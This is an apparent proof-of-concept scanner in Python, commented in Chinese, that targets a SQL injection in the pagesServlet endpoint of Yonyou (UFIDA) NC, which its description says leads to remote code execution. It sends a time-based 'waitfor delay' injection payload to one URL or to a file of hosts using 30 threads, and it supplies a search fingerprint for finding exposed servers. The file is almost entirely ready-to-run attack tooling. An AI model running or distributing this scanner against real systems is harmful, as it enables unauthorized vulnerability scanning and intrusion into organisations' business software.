"""
介绍：用友NC pagesServlet SQL注入致RCE
指纹：app:"用友 UFIDA NC"
"""
import argparse
import textwrap
import time
from multiprocessing.dummy import Pool

import requests
from urllib3.exceptions import InsecureRequestWarning


def check(target, timeout=10):
    try:

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) '
                          'Chrome/94.0.4606.81 Safari/537.36',
            'Accept': '*/*',
            'Connection': 'close',
        }
        url = target.strip('/') + "/portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0" \
                                  ":5'--"
        # 抑制 InsecureRequestWarning 警告
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
        start_time = time.time()
        response = requests.post(url, headers=headers, verify=False, timeout=timeout)
        elapsed_time = time.time() - start_time
        if 5 < elapsed_time < 10:
            print('[*]可能存在漏洞 ' + target)
        else:
            print('[-]不存在漏洞 ' + target)
    except requests.exceptions.Timeout:
        print(f"请求超时{target},可能存在漏洞")
    except Exception as e:
        print(f"连接失败{target}-无法建立连接")


def main():
    banner = """
                                          .-') _                                                  
                                     ( OO ) )                                                 
          ,--.   ,--..-'),-----. ,--./ ,--,'  ,----.      ,--.   ,--..-'),-----.  ,--. ,--.   
           \  `.'  /( OO'  .-.  '|   \ |  |\ '  .-./-')    \  `.'  /( OO'  .-.  ' |  | |  |   
         .-')     / /   |  | |  ||    \|  | )|  |_( O- ) .-')     / /   |  | |  | |  | | .-') 
        (OO  \   /  \_) |  |\|  ||  .     |/ |  | .--, \(OO  \   /  \_) |  |\|  | |  |_|( OO )
         |   /  /\_   \ |  | |  ||  |\    | (|  | '. (_/ |   /  /\_   \ |  | |  | |  | | `-' /
         `-./  /.__)   `'  '-'  '|  | \   |  |  '--'  |  `-./  /.__)   `'  '-'  '('  '-'(_.-' 
           `--'          `-----' `--'  `--'   `------'     `--'          `-----'   `-----'    
        """
    print(banner)
    parse = argparse.ArgumentParser(description="用友NC pagesServlet SQL注入致RCE漏洞", formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=textwrap.dedent('''example:
    python3 yongyou_fileup.py -u http://xxxx.xxxx.xxxx.xxxx
    python3 yongyou_fileup -f x_url.txt '''))
    parse.add_argument('-u', '--url', dest='url', type=str, help='添加url信息')
    parse.add_argument('-f', '--file', dest='file', type=str, help='添加txt文件')

    args = parse.parse_args()
    targets = []
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            f = open(args.file, 'r+')
            for target in f.readlines():
                target = target.strip()
                if 'http' in target:
                    targets.append(target)
                else:
                    url = f"http://{target}"
                    targets.append(url)
            pool.map(check, targets)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
